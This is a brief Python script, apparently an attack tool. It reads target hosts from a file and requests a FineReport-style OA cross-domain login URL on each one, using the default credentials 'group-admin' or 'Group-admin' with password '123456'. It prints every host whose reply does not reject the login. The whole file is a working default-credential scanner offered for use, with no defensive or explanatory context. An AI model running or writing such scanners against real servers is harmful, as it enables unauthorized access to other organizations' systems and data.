import requests
import sys

fileName = sys.argv[1]

f = open(fileName,'r',encoding='utf-8')

hosts = list()

for i in f.readlines():
    hosts.append(i.replace('\n',''))

f.close()


urls = list()

for i in hosts:
    urls.append(i+'oaReport/decision/login/cross/domain?fine_username=group-admin&fine_password=123456&validity=-1')
    urls.append(i+'oaReport/decision/login/cross/domain?fine_username=Group-admin&fine_password=123456&validity=-1')

for i in urls:
    try:
        x = requests.get(i,timeout=0.5)
        if "User not exist, or wrong password!" not in x.text and x.status_code!=404:
            print(i)
            print(x.text)
    except BaseException:
        continue
